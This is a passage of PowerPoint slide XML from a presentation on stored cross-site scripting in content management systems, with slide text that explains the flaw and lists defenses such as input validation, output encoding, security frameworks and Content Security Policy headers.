          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Popular content management systems frequently suffer stored XSS flaws in comment sections and user input modules, enabling attackers to inject persistent malware, phishing redirects, and credential harvesting scripts affecting thousands of websites.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139672" y="1226582"/>
            <a:ext cx="7208401" cy="468749"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="403CCF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Prevention: Building Secure Defenses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2031563" y="1844040"/>
            <a:ext cx="5208627" cy="4348043"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 518"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="403CCF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2181463" y="1943219"/>
            <a:ext cx="2250162" cy="281226"/>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Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The Critical Reality</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2181463" y="2323624"/>
            <a:ext cx="4908828" cy="797243"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Stored XSS exploits unsanitized user input that's stored and rendered by web applications. Attackers inject persistent malicious scripts that execute on every page load, affecting all users who view the compromised content.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7505700" y="2180511"/>
            <a:ext cx="2446615" cy="1670804"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4378"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBFAFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7505700" y="2165271"/>
            <a:ext cx="2446615" cy="60960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8503980" y="1955602"/>
            <a:ext cx="449937" cy="449937"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8638996" y="2068116"/>
            <a:ext cx="179903" cy="224909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670840" y="2555438"/>
            <a:ext cx="1875115" cy="234315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Input Validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670840" y="2888933"/>
            <a:ext cx="2116336" cy="797243"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Implement strict validation that rejects suspicious characters and script patterns at the entry point</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10051494" y="2180511"/>
            <a:ext cx="2446615" cy="1670804"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4378"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBFAFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Image 2" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10051494" y="2165271"/>
            <a:ext cx="2446615" cy="60960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 3" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11049774" y="1955602"/>
            <a:ext cx="449937" cy="449937"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11184791" y="2068116"/>
            <a:ext cx="179903" cy="224909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10216634" y="2555438"/>
            <a:ext cx="1875115" cy="234315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Output Encoding</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10216634" y="2888933"/>
            <a:ext cx="2116336" cy="597932"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Apply proper HTML encoding to all user-generated content before rendering in browsers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7505700" y="4175403"/>
            <a:ext cx="2446615" cy="1905119"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBFAFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="Image 4" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7505700" y="4160163"/>
            <a:ext cx="2446615" cy="60960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Image 5" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8503980" y="3950494"/>
            <a:ext cx="449937" cy="449937"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8638996" y="4063008"/>
            <a:ext cx="179903" cy="224909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670840" y="4550331"/>
            <a:ext cx="2038469" cy="234315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Security Frameworks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670840" y="4883825"/>
            <a:ext cx="2116336" cy="797243"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Utilize libraries and frameworks that automatically escape output and sanitize input</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10051494" y="4175403"/>
            <a:ext cx="2446615" cy="1905119"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBFAFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="25" name="Image 6" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10051494" y="4160163"/>
            <a:ext cx="2446615" cy="60960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="Image 7" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11049774" y="3950494"/>
            <a:ext cx="449937" cy="449937"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11184791" y="4063008"/>
            <a:ext cx="179903" cy="224909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10216634" y="4550331"/>
            <a:ext cx="2116336" cy="468630"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Libre Baskerville" pitchFamily="34" charset="0"/>
                <a:ea typeface="Libre Baskerville" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Libre Baskerville" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Content Security Policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10216634" y="5118140"/>
            <a:ext cx="2116336" cy="797243"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="49495A"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deploy CSP headers to restrict script execution and prevent unauthorized code from running</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2139672" y="6303645"/>
            <a:ext cx="10350937" cy="699254"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3218"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C3C2F0"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="31" name="Image 8" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2289572" y="6512123"/>
            <a:ext cx="187404" cy="149900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2626876" y="6440210"/>
            <a:ext cx="9713833" cy="398621"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Open Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Open Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Open Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
